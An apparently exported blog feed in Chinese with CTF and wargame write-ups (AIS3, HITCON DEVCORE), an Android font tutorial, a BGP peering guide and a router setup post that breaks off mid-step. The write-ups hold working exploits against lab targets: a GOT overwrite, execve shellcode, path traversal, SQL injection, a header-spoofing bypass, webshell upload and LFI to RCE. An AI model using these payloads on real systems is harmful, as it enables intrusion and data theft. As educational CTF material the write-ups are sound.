MCwxLDAsMWgtMTAyYzIuMy04LjcsMTEuNi0xMS43LDIwLjgtMjAuMSBjNS4zLTQuOCwxMC41LTExLjQsMTQuMi0yMS45OyBNNjcuMSwxMDkuNWMtOS42LDAtMjMuNi04LjgtMjMuNi0yNGMwLTEyLjEsMTcuOC00MSwzNy41LTQxYzE1LjYsMCwyMy4zLDEwLjYsMjUuMSwyMC41IGMxLjksMTAuNywzLjksOC4yLDMuOSwxOS41YzAsOC4yLTMuOCwxNy0zLjgsMjIuM2MwLDMuOSwxLjQsNy40LDIuOSwxMC41YzEuNywzLjUsMi40LDYuNiwyLjQsOS4ySDkuNWMwLTEzLjcsMTAuOC0xNCwyMS4xLTIzIGM1LjYtNC45LDExLTEyLjQsMTQuNS0yNiAiPjwvYW5pbWF0ZT48L3BhdGg+PHBhdGggaWQ9ImJlYWsiIGZpbGw9IiM3YjhjNjgiPjxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9ImQiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IiBNNzguMjksNzBjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzc4LjI5LDg1LjUsNzguMjksNzBaOyBNNjIuMjksNjRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzYyLjI5LDc5LjUsNjIuMjksNjRaOyBNNDguMjksNjdjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQ4LjI5LDgyLjUsNDguMjksNjdaOyBNMzYuMjksNzNjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM2LjI5LDg4LjUsMzYuMjksNzNaOyBNMzUuMjksNzVjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM1LjI5LDkwLjUsMzUuMjksNzVaOyBNNDEuMjksODFjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQxLjI5LDk2LjUsNDEuMjksODFaOyBNNTkuMjksODRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzU5LjI5LDk5LjUsNTkuMjksODRaOyBNNzIuMjksODljMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzcyLjI5LDEwNC41LDcyLjI5LDg5WjsgTTgwLjI5LDgyYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4MC4yOSw5Ny41LDgwLjI5LDgyWjsgTTg3LjI5LDc4YzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4Ny4yOSw5My41LDg3LjI5LDc4WjsgTTc4LjI5LDcwYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M3OC4yOSw4NS41LDc4LjI5LDcwWiAiPjwvYW5pbWF0ZT48L3BhdGg+PGVsbGlwc2UgaWQ9ImV5ZS1yaWdodCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iMTAwOzg0OzcwOzU4OzU3OzYzOzgxOzk0OzEwMjsxMDk7MTAwIj48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjxlbGxpcHNlIGlkPSJleWUtbGVmdCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iNjcuNTs1MS41OzM3LjU7MjUuNTsyNC41OzMwLjU7NDguNTs2MS41OzY5LjU7NzYuNTs2Ny41Ij48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjwvc3ZnPjwvZGl2Pg==&quot;;  const encodedChallengeObject = &quot;NDBCMjBnMzBpNTFKNjA2MDFcMzB3NDAxMzBBNDFqNDBcNDExMzBnNzB1MzBpMTBrMzBsNDA3NjB4NTBpNTBYMTBLMTBJNDBoNTBYMDBLNDFpNTFsNzA2NzBmNDBvMTA2NTA1NzBLMTFuNTE4NzA3NDFCNTAtMTE4NDB3MzFhMTByNDF6NzBLMzA9MjA9MTA9&quot;;  const wpoStr = &quot;QWxTM3tCYXNFNjRfaTUrYjByTkluZ35cUXdvLy14SDhXekNqN3ZGRDJleVZrdHFPTDFHaEtZdWZtWmRKcFg5fQ==&quot;;  const fps = 8;  const max = 10;  let obj;  let hour = 0;  let wrap = (tag, expressions, fn) =&gt; &#123;    return &#x27;&lt;span&gt;&lt;div class=&quot;c&#x27; + tag + &quot; r&quot; + expressions + &#x27;&quot;&gt;&#x27; + fn + &quot;&lt;/div&gt;&lt;/span&gt;&quot;;  &#125;;  let create = (str) =&gt; &#123;    return document[&quot;getElementById&quot;](&quot;output&quot;)[&quot;innerHTML&quot;] = init(str);  &#125;;  document[&quot;addEventListener&quot;](&quot;keydown&quot;, (result) =&gt; &#123;    if (result[&quot;key&quot;] === &quot;Backspace&quot; &amp;&amp; hour == 10) &#123;      obj[&quot;textContent&quot;] = obj[&quot;textContent&quot;][&quot;substr&quot;](0, obj[&quot;textContent&quot;][&quot;length&quot;] - 1);    &#125; else &#123;      if (result[&quot;key&quot;] === &quot;ArrowUp&quot; &amp;&amp; !(hour &gt;&gt; 1)) &#123;        return hour = hour + 1;      &#125; else &#123;        if (result[&quot;key&quot;] === &quot;ArrowDown&quot; &amp;&amp; !(hour &gt;&gt; 2)) &#123;          return hour = hour + 1;        &#125; else &#123;          if (result[&quot;key&quot;] === &quot;ArrowLeft&quot; &amp;&amp; (hour == 4 || hour == 6)) &#123;            return hour = hour + 1;          &#125; else &#123;            if (result[&quot;key&quot;] === &quot;ArrowRight&quot; &amp;&amp; (hour == 5 || hour == 7)) &#123;              return hour = hour + 1;            &#125; else &#123;              if (result[&quot;key&quot;] === &quot;b&quot; &amp;&amp; hour == 8) &#123;                return hour = hour + 1;              &#125; else &#123;                if (result[&quot;key&quot;] === &quot;a&quot; &amp;&amp; hour == 9) &#123;                  return document[&quot;getElementsByTagName&quot;](&quot;body&quot;)[0][&quot;innerHTML&quot;] += atob(importSave),                   obj = document[&quot;getElementById&quot;](&quot;input&quot;), obj[&quot;innerHTML&quot;] = &quot;&quot;,                   document[&quot;getElementById&quot;](&quot;output&quot;)[&quot;innerHTML&quot;] = atob(encodedChallengeObject)[&quot;match&quot;](/(.&#123;1,3&#125;)/g)[&quot;map&quot;]((clean) =&gt; &#123;                                                                            return wrap(clean[0], clean[1], clean[2]);                                                                          &#125;)[&quot;join&quot;](&quot;&quot;),                   hour = hour + 1;                &#125; else &#123;                  if (result[&quot;key&quot;][&quot;length&quot;] == 1 &amp;&amp; hour == 10) &#123;                    obj[&quot;textContent&quot;] += String[&quot;fromCharCode&quot;](result[&quot;key&quot;][&quot;charCodeAt&quot;]());                  &#125; else &#123;                    return;                  &#125;                &#125;              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;    create(obj[&quot;textContent&quot;]);  &#125;);&#125;)();

大致分成兩 part第一 part 是輸入神秘按鍵解鎖達到第二 part
神秘按鍵就是 : 上上下下左右左右ba
接著第二關他說他已經把 flag 加密了如果我們輸入 “對的東西 就會得到對的加密”
意思就是只知道 flag 加密後的樣子
看一下 code 理解後發現是 base1024於是就自己寫一下 code 來解密

exp.py
import stringmaps = &#x27;AlS3&#123;BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9&#125;&#x27;goals = [&#x27;40B&#x27;, &#x27;20g&#x27;, &#x27;30i&#x27;, &#x27;51J&#x27;, &#x27;606&#x27;, &#x27;01\\&#x27;, &#x27;30w&#x27;, &#x27;401&#x27;, &#x27;30A&#x27;, &#x27;41j&#x27;, &#x27;40\\&#x27;, &#x27;411&#x27;, &#x27;30g&#x27;, &#x27;70u&#x27;, &#x27;30i&#x27;, &#x27;10k&#x27;, &#x27;30l&#x27;, &#x27;407&#x27;, &#x27;60x&#x27;, &#x27;50i&#x27;, &#x27;50X&#x27;, &#x27;10K&#x27;, &#x27;10I&#x27;, &#x27;40h&#x27;, &#x27;50X&#x27;, &#x27;00K&#x27;, &#x27;41i&#x27;, &#x27;51l&#x27;, &#x27;706&#x27;, &#x27;70f&#x27;, &#x27;40o&#x27;, &#x27;106&#x27;, &#x27;505&#x27;, &#x27;70K&#x27;, &#x27;11n&#x27;, &#x27;518&#x27;, &#x27;707&#x27;, &#x27;41B&#x27;, &#x27;50-&#x27;, &#x27;118&#x27;, &#x27;40w&#x27;, &#x27;31a&#x27;, &#x27;10r&#x27;, &#x27;41z&#x27;, &#x27;70K&#x27;, &#x27;30=&#x27;, &#x27;20=&#x27;, &#x27;10=&#x27;]ls = list()for goal in goals:	check = False	for i in range(len(maps)):		if goal[2] == maps[i]:			check = True			ls.append(i)	if not check:		ls.append(0)flag = &#x27;&#x27;for i in range(len(ls)):	tmp = ls[i]	while tmp &lt; 1024:		if tmp &gt;&gt; 6 &amp; 7 == int(goals[i][0]) and tmp &gt;&gt; 9 == int(goals[i][1]):			b = bin(tmp)[2:]			pad = 10 - len(b)			for i in range(pad):				b = &#x27;0&#x27; + b			flag += b			break		tmp += 64flag = bytes.fromhex(hex(int(flag, 2))[2:])print(flag)

flag : AIS3&#123;base1024_15_c0l0RFuL_GAM3_CL3Ar_thIS_IS_y0Ur_FlaG!&#125;



PwnWrite Me題目把 system() 的 got 表給覆寫成 0x0 了稍微找一下原本 system 的 got 指向哪然後還原即可

exp.py
from pwn import *host = &#x27;quiz.ais3.org&#x27;port = 10102r = remote(host, port)r.recvuntil(&#x27;Address: &#x27;)r.sendline(str(0x404028))r.recvuntil(&#x27;Value: &#x27;)r.sendline(str(0x0000000000401050))print(r.recv())r.interactive()

flag : AIS3&#123;Y0u_know_h0w_1@2y_b1nd1ng_w@rking&#125;


noper這題也蠻酷的題目隨機在我們的 shell code 位置塞上 nop但因為是偽隨機 所以其實是固定的 (汗首先就先 parse 看看在哪幾個位置會被塞
得出的 offset 是這幾個
060a0d1127292c333f

接著就開始分割我們的 shell code 塞進足夠的位置我用的是這個 27 bytes 的 shell code 然後分成兩段

exp.pyfrom pwn import *host = &#x27;quiz.ais3.org&#x27;port = 5002r = remote(host, port)code = [ 0x90 for i in range(64) ]part1 = b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99&#x27;part2 = b&#x27;\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;for i in range(len(part1)):    code[18 + i] = part1[i]for i in range(len(part2)):    code[52 + i] = part2[i]r.recvuntil(&#x27;Give me some code:&#x27;)r.sendline(bytes(code))r.interactive()

]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 7.0+ CJK 擴充字 新增額外字庫</title>
    <url>/posts/2020-06-26-Android-7-0-CJK-%E6%93%B4%E5%85%85%E5%AD%97-%E6%96%B0%E5%A2%9E%E9%A1%8D%E5%A4%96%E5%AD%97%E5%BA%AB/</url>
    <content><![CDATA[Prologue最近剛好有用手機看書的需求再加上看的都是一些很古老的書 (ex. 山海經)自然就會出現許多稀難字有興趣的朋友可以先到 這裡 看一下自己是不有一堆口 XD其實就連電腦應該也不少人滿滿的口




那也因為這樣書看一看就一個口而那些古字通常都是重要的名詞我要馬得跳過要馬得去用我的電腦哪來隨時能用電腦啊我就看的正爽被卡，豈有此理 &#x3D;日&#x3D;所以我很不爽，就產生了這篇文章…
Intro先來說說為什麼會出現口一般我們的裝置中都會有一些預設字體而我們看到的 “字” 其實是從字體檔中把 編號 對應 圖形 然後顯示給我們看那如果字體檔本身不支援到某些編號自然就印不出那些字啦~ 所以就變成口了
好的 那就開始進入正題
這次要用的字體為 hanazono (俗稱 花園字體)本身支持 CJK Ext.A ~ Ext.F而最新的擴充區只到 G等於說 花園字體 目前幾乎全包了各種詭異中文字，字量堪稱龐大也讓我們期待什麼時候更新 Ext.G 進去吧XD
Notice &amp; Tools
注意
:::danger  &gt; ROOT Only &lt;
  接下來會動到系統  如果不會救磚，請不要恣意操作  :::

沒有 root 的檔案瀏覽器是沒辦法動到系統的喔  當然你也可以用 adb shell





沒有 Root，不叫 Android [name&#x3D;chess]


工具

MiXplorer
先跟各位介紹一款 Android 上目前我認為最神的檔案瀏覽器  這不是工商，因為我沒收錢  至於它有多強大的功能，各位可以自己去看看
接下來的操作你會大量需要它




所需檔案

HanaMinA.ttf, HanaMinB.ttf (下載花園字體解包獲得)
/system/etc/fonts.xml
/system/fonts/



Tutorial
先將HanaMinA.ttf, HanaMinB.ttf 複製到 /system/fonts/ 底下 並將這兩個檔案權限設定為 644 (-rw-r--r--) 並且 擁有者 與 群組 確定為 root

打開 /system/etc/fonts.xml 開始修改 直接拉到底部
     &lt;family lang=&quot;zg&quot;&gt;        &lt;font weight=&quot;400&quot; style=&quot;normal&quot;&gt;MyanmarSangamZawgyi-Regular.otf&lt;/font&gt;        &lt;font weight=&quot;700&quot; style=&quot;normal&quot;&gt;MyanmarSangamZawgyi-Bold.otf&lt;/font&gt;    &lt;/family&gt;&lt;/familyset&gt;
 你會看到一堆類似的東西，裡面內容物可能不一樣 不過沒關係 我們只需要找到 &lt;/familyset&gt; 在它的前面新增東西即可
     &lt;family lang=&quot;zg&quot;&gt;        &lt;font weight=&quot;400&quot; style=&quot;normal&quot;&gt;MyanmarSangamZawgyi-Regular.otf&lt;/font&gt;        &lt;font weight=&quot;700&quot; style=&quot;normal&quot;&gt;MyanmarSangamZawgyi-Bold.otf&lt;/font&gt;    &lt;/family&gt;    &lt;!-- custom CKJ Extension begin --&gt;    &lt;family&gt;        &lt;font weight=&quot;400&quot; style=&quot;normal&quot;&gt;HanaMinA.ttf&lt;/font&gt;    &lt;/family&gt;    &lt;family&gt;        &lt;font weight=&quot;400&quot; style=&quot;normal&quot;&gt;HanaMinB.ttf&lt;/font&gt;    &lt;/family&gt;    &lt;!-- custom CKJ Extension end --&gt;&lt;/familyset&gt;
 那兩段灰色字之間就是我們自己新增的段落
 儲存之後 重開瀏覽器去看上面一堆口的網頁是否有正常顯示那些字 有顯示那些奇怪字就代表成功囉~
 

Epilogue雖然說整個教學區塊非常短就結束了但我幾乎都要爬爆 Google 了才找到解答 QQ主要是因為網路上的教程幾乎都是在處理多字重的問題完全沒看到討論擴充字花了幾天終於看到一篇作者自己寫了 Magisk 套件來處理這個問題我也去分析了這個專案到底如何做到這個功能也因此才完整理解了 font.xml 這份文件的運作原理
再來就是為什麼標題會寫 7.0+ 呢?是因為 Android 7.0 之後的字體 loading 方式有所變更目前為止到 10.0 應該都是可以用的 (?在之前都是由 fallback_fonts.xml 與 fonts.xml 共存來處理而在 7.0 之後直接捨棄了 fallback_fonts.xml並將整個 fonts.xml 重寫使得檔案減少但是功能卻更齊全也更容易讀懂
最後的最後我一定要噴一下原本用了這支 ASUS Zenfone 3 Deluxe  一年多就不維護系統這支是旗艦機欸 ASUS 大大連原本自家論壇都被抹掉 一堆資料都找不太到這些綜合因素讓我很不爽一度有了這隻壞了就想要跳坑 iPhone 的想法
但經過這次之後我覺得還是 Android 比較香喔絕對不是 ASUS 香我以後不會再買這家的手機了再加上 iPhone 感覺越來越沒有特別突出的地方所以最後決定還是要留在我大安卓自由國度~
不知道這隻什麼時候會壞掉 我想換 Pixel ~

如有任何指教 歡迎發信給我~

]]></content>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>ASN 初體驗 Part 2</title>
    <url>/posts/2021-08-17-ASN-%E5%88%9D%E9%AB%94%E9%A9%97-Part-2/</url>
    <content><![CDATA[在 ASN 與 IP 發下來後我們接著需要將擁有的 IP 廣播出去讓世界知道如果要連過來這些 IP 該怎麼走


要廣播到全世界我們必須透過 BGP 這個協議 來與他人 (AS) 對等接著透過不同分級的 AS 將你的路由一路廣播到其他地方這才算完成 IP 宣告
What is BGP?全名 Border Gateway Protocol使用 port 179用於 AS 之間交換路由表所以這也是為什麼上一篇說一定要先有 ASN 才能做接下來的動作因為需要宣告你的 ASN 給對方 (當然這部分可以偽造，只是大多數都會手動驗證該 ASN 是否真的是你擁有)
兩個 host 之間做連接透過 BGP 交換路由表 稱為 peering (對等)於 AS 內的對等稱為 iBGP (Interior BGP)跨 AS 的對等則稱為 eBGP (Exterior BGP)
通常大量對等的地方會發生在一個叫做 IX (Internet Exchange) 的地方IX 裡面會有大量的機器互相用實體線連接對等或是使用打 tunnel 的方式來跟別人對等 (ex. VPN)
AS 分級在全球的這樣繁雜的路由交互作用下AS 不單單只為了宣告自己的路由而用也有某些 AS 為了要處理他人的路由而存在大致上分為三個階級

T1  全世界路由能互相轉送的維護者  負責提供給其他階級 AS transit 服務  所有 T1 AS 呈現全連接的星狀網路結構

T2  提供給他人 transit  同時也會跟 T1 transit  藉此來讓底下 AS 的路由能送往全世界

T3  只送出自己要廣播的路由  而不會 transit 任何他人的路由


那當然我們最一開始只須要當個 T3 菜雞就好 (x
DIY Time上面大致介紹了相關的概念後接著就實際來操作一遍吧想要便宜就能 peering 的話Vultr 或是 iFog 都有免費提供 BGP 宣告只要你有租用他們的 VPS 的話Vultr 最便宜 5 USD &#x2F;moniFog 最便宜 3.5 EUR &#x2F;mongVultr 全世界很多地方都有iFog 則是專門提供歐洲區域 因此 ping 有點高
那由於這次 demo 的 ASN 是使用 RIPE 核發的因此根據其規定需在歐洲服務區域內使用所以當然就選 iFog 啦地點是 Frankfurt 台灣直連大概 ping 213
Install Service首先我們需要先使用能夠使用BGP協議的服務目前大宗有 Bird 和 FRRounting那今天就先選用 Bird 來做示範所以就先來安裝吧
系統為 Debian 10由於 Bird 版本有 1.X 跟 2.X 的差異設定幾乎大改 等於不兼容如果要裝 2.X 且 Debian &lt;&#x3D; 11請記得先加上 backports 的 apt source
sudo apt install -y bird2

安裝完成後設定檔位於 /etc/bird/我們需要修改其中的 bird.conf 來宣告 BGP
Peering我們直接來看設定檔
在這個步驟之前你需要先跟 iFog 申請好 BGP session他會要求你提供你的 ASN 以及你想要宣告的 IP Range
審核完後他會給你一些關於對等的資訊包括 iFog 的 ASN, neighbor ip 或是建立BGP連線時所需的密碼 (不一定有)
log syslog all;router id 193.148.249.81;protocol device &#123;&#125;protocol static MY_v6&#123;	ipv6;	route 2a0f:607:1500::/48 reject;&#125;filter BGP_OUT&#123;	if proto = &quot;MY_v6&quot; then accept;	reject;&#125;protocol bgp ifog_v6&#123;	local 2a0c:9a40:1030::355 as 210932;	neighbor 2a0c:9a40:1030::1 as 34927;	graceful restart on;	ipv6	&#123;		import none;		export filter BGP_OUT;	&#125;;&#125;

在這份設定檔中

首先記得 router id 的部分  通常是填寫這台機器的世界唯一編號 (通常就直接填 VPS 供應商當初給你的 IPv4 就好)

接著是 protocol static 的部分  這個是即將會被你往外宣告的 IP Range

最後是 protocol bgp 的部分  這邊填的就是對等資訊  包括

你的 ASN 以及該台機器對方要求跟你溝通的 IP 位址 填在 local
對方提供給妳的資訊填在 neighbor
最後是 ipv6 區域  我們要透過該 filter 去指定要 export 出去的路由  詳細可以去翻其他教學看看 filter 怎麼寫 這邊不贅述  (filter 非常重要，如果沒寫好不只造成自己路由表大亂，也可能會給對方造成極大的麻煩)



當設定檔完成後我們需要使用 sudo birdc 進入 Bird 的互動畫面接著使用 configure 來 reload 剛剛的設定

如果沒噴錯就可以使用 show protocols 來檢查看看 BGP 連線是否正常

當出現 Established  就代表該 BGP 連線正常運作了
如果還需要更詳細的訊息可以使用 show protocols all [name]大概長得像下面這樣

Verify在成功宣告後通常這些供應商傳路由都非常迅速應該宣告出去過個幾分鐘就好了或是可以先使用 iFog 自己的 Looking Glass 服務來檢查由於我在 Frankfurt 就使用當地的服務吧 iFog lg in Frankfurt

裡面有一些方便工具可以使用這裡推薦使用 mtr它同時具備 ping 以及 traceroute 的功能如果在 server 上使用請裝 mtr-tinyMacOS 的話就直接 brew install mtr 就好
回到 Looking Glass這邊就輸入自己擁有的某一個 IP 並且將它給在剛剛那台建立 BGP 的機器上
拿我的舉例

我的機器給了 2a0f:607:1500::2 在我的某個網卡上那在 LG 上面就輸入這個 IP 看它是否抓的到

看來非常正常的從 iFog 內部連線找到了通常到了這邊就代表你的路由已經宣告出去只要 iFog 那邊沒搞事就會正常散播到 T1 AS 那邊讓全世界看見了~
Final這邊補個我從其他 server mtr 的結果這是大老 SteveYi 自己的建的 Looking Glass

可以看到它從美國一路往上走走走到了 iFog 那邊接著才到了我的 Server
]]></content>
      <tags>
        <tag>network</tag>
        <tag>ASN</tag>
        <tag>IPv6</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON 2021 - DEVCORE Wargame Writeups</title>
    <url>/posts/2021-12-05-HITCON-2021-DEVCORE-Wargame-Writeups/</url>
    <content><![CDATA[官方 src : https://github.com/DEVCORE-Wargame/HITCON-2021
沒想到自己也能有把 DEVCORE 題目破台的一天 痛哭流涕 QQ



雖然我是照弱點順序寫 writeup但其實我在打的的時候是 1 -&gt; 3 -&gt; 4 -&gt; 5 -&gt; 6 -&gt; 2完全忽略了 broken access 這個超常見的洞然後找不到 flag XD
弱點 01：Path Traversal從 image.php 的 GET 變數 id 可以發現是 base64 後的檔案名稱猜測可以進行 LFI用 http://web.ctf.devcore.tw/image.php?id=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA== 驗證可以取得 /etc/passwd但我們不知道 web root 位置因此使用 /proc/self/cwd/最後發現 flag 在 include.php 中

payloadhttp://web.ctf.devcore.tw/image.php?id=Li4vLi4vLi4vLi4vcHJvYy9zZWxmL2N3ZC9pbmNsdWRlLnBocA==



flag : DEVCORE&#123;no.1_path_traverse_to_the_m00n&#125;


弱點 02：Broken Access Control這邊其實我是 RCE 才回頭撈 db 的 wwwww
原本思路應該是從 order.php 中可以看到傳入的 GET 參數 sig 被傳進 get_sig_hash() 後跟 db 內的 sig_hash 比較在條件中 先檢查了 hash_sig 後才跟 db 比較get_sig_hash() 最後是返回 hash_hmac() 的結果如果傳進去的 data 是一個陣列而不是一個字串則會返回 false 從而繞過比較

payloadhttp://web.ctf.devcore.tw/order.php?id=1&amp;sig[]=aaa



flag : DEVCORE&#123;no.2_bre8k_acc3ss_c0ntrol&#125;


弱點 03：SQL Injection從 print.php 中可以發現未對 GET 變數 id 進行過濾且直接將 id 串接至 sql 語句利用 union based leak 出所有 db 結構
http://web.ctf.devcore.tw/print.php?sig=1&amp;id=-1%20union%20select%201,2,group_concat(column_name),4,5,6,7,8,9%20from%20information_schema.columns%20where%20table_name=%27items%27


web

items
id,title,description


rate_limit
ip,last_visit,visit_times


orders
id,name,email,phone,status,sig_hash,order_date,address,note


options
key,value


backend_users
id,username,password,description




payload
http://web.ctf.devcore.tw/print.php?sig=1&amp;id=-1%20union%20select%201,2,group_concat(description),4,5,6,7,8,9%20from%20backend_users

admin creds

admin:u=479_p5jV:Fsq(2





flag : DEVCORE&#123;no.3_sql_injection_my_passw0rd_is_y0urs&#125;


弱點 04：Use of Less Trusted Source從 /proc/self/mounts leak 出的後台地址位於 /usr/share/nginx/b8ck3nd/並且得知後台的include.php 中有檢查連線 IP 是否來自指定 IP可以透過 X-Forwarded-For 偽造並且只用弱點 03 得到的 admin 帳密進行登入

payloadcurl -H &quot;X-Forwarded-For: 127.0.0.1&quot; -b &quot;PHPSESSID=dvcj3di7tqkfl3p67qikjvnckh&quot;  &quot;http://web.ctf.devcore.tw/b8ck3nd/&quot;



flag : DEVCORE&#123;no.4_x-forward-for_2b_or_n0t_2b&#125;


弱點 05：Unrestricted File Upload在 /b8ck3nd/upload.php 中存在 POST 變數 rename 跟 folder 可以自訂檔名以及路徑上傳 webshell 後就彈出 flag 了

payloadcurl -X POST -H &quot;X-Forwarded-For: 127.0.0.1&quot; -b &quot;PHPSESSID=dvcj3di7tqkfl3p67qikjvnckh&quot; -F &quot;file=@chess.php&quot; -F &quot;rename=chess.php&quot; -F &quot;folder=../../../../tmp&quot; &quot;http://web.ctf.devcore.tw/b8ck3nd/upload.php&quot;



flag : DEVCORE&#123;no.5_file_uploaded_wheres_my_sh3ll&#125;


弱點 06：Local File Inclusion利用弱點 05 覆蓋自己的 session利用 include.php 中會對 $_SESSION[&#39;lang&#39;] 進行 include寫入 web shell 且複寫 session file 達到 RCE

sess_xxx  lang|s:27:&quot;../../../../../../tmp/chess&quot;;

payload
curl -X POST -b &quot;PHPSESSID=dvcj3di7tqkfl3p67qikjvnckh&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -F &quot;file=@sess_dvcj3di7tqkfl3p67qikjvnckh&quot; -F &quot;rename=sess_dvcj3di7tqkfl3p67qikjvnckh&quot; -F &quot;folder=../../../../tmp&quot; &quot;http://web.ctf.devcore.tw/b8ck3nd/upload.php&quot;
http://web.ctf.devcore.tw/?cmd=/readflag



flag : DEVCORE&#123;no.6_local_file_include_t0_rescu3&#125;

]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次跟小烏龜說再見</title>
    <url>/posts/2024-09-15-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B7%9F%E5%B0%8F%E7%83%8F%E9%BE%9C%E8%AA%AA%E5%86%8D%E8%A6%8B/</url>
    <content><![CDATA[上班後終於有閒錢可以開始把自己心目中的設備一步步堆起來了這次除了增添了 Mikrotik RB5009UG 以外還順便買了一個 PON Stick (俗稱光貓棒) 準備一併替換掉中華電信的小烏龜


前置這邊我購買的光貓棒是 ODI 的 DFP-34X-2C2詳細規格可以參考這裡
那在購買前首先要注意一下自己的小烏龜型號是否支援可以參考這個連結另外我自己的型號為 RTF8207W-E雖然沒有在表上但也可以通
另外我的光貓棒韌體是為 220923如果你的太舊或是不通可以嘗試使用這個版本或是使用此 Github Issue 中提供的最新版本 240408但這個版本目前只能算是測試版本不過也有修正了 vlan id auto 的問題以及在 PON 資訊頁面多顯示了 OLT 的資訊

如果發現使用 240408 的時候版本會在局端信號一通然後重開機後就會被強制降版回 220923 的話可以先從 telnet reset 所有 config然後連刷兩次 240408 的版本然後再進 telnet reset 一次這樣就可以讓版本真正的升級上去而不會被降版了

最後記得登進去小烏龜紀錄以下資訊

軟體版本
GPON 序號

以及到 這邊 來查詢自己的線路號碼用你當初辦網路的那張卡片上的 HN 號碼以及密碼登入會看到一組 “附掛號碼”那就是你的線路號碼
連接光貓棒首先要先將光纖接上光貓棒才有辦法將其啟動然後再插上路由器的 SFP 孔
接著可以去 Interface 檢查是否有正常上電

粗淺判斷可以直接看 SFP 最前面是否有一個 R 的 tag 存在這在後面如果有對光貓棒設定然後要重新啟動時可以直接從這裡判斷光貓棒是否重啟完成
要詳細確認可以點進去 SFP如果正常最上面會顯示 link ok

如果沒正常讀取到則會顯示 no link
DFP-34X-2C2 網路介面卡預設值為 192.168.1.1注意一下自己的路由器是否會相衝到 IP 地址
由於我們是使用 RouterOS 產品預設會將 ether1 作為 WAN而其他網口則會全部被加入 bridge 當中
因此我們要先去 Bridge -&gt; Ports 設定 SFP 排除在 bridge 之外

接著要去 Interfaces -&gt; Interface List 將 SFP 加入至 WAN

最後就是去 IP -&gt; Addresses 幫 SFP 新增一組 IP這邊我直接用 192.168.1.2並且我有將我的內網網段改成 192.168.11.0/24

到這邊就能成功看到貓棒的畫面囉預設帳密為 admin:admin

設定 OMCI config登入成功後就直接進到 setting 頁面首先將 MAC 跟 MACKEY 先複製出來備份
接著這邊要填寫的設定有以下幾個

PLOAM Format: 選擇 ASCII 即可
PLOAM Password: 填你的線路號碼 (英數字 10 碼)

填完後先按上面的 Apply Changes然後接著填

